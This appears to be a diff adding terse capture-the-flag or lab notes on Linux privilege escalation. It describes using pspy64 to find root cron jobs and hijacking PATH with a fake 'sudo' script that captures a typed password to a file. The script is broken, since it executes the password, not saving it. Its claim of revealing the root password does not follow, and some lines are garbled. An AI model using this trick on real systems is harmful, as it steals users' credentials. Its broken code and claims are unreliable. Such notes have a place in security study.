@@ -1,0 +1,21 @@
+Use pspy64 to check root cronjob
+
+sudo /etc/shadow is on
+
+/usr/bin/sudo is also suid.
+
+In order to take advantage of /usr/bin/sudo, we must put /home/frank to the path
+
+export PATH=/home/frank:$PATH
+save the path to /.bashrc
+
+
+#!/bin/bash
+read -sp ‘[sudo] password for frank:’ password
+$password > /home/frank/frankpassword.txt
+
+Save that command with the filename called sudo
+
+logout and login again.
+
+You will see the root password in frankpassword.txt file.
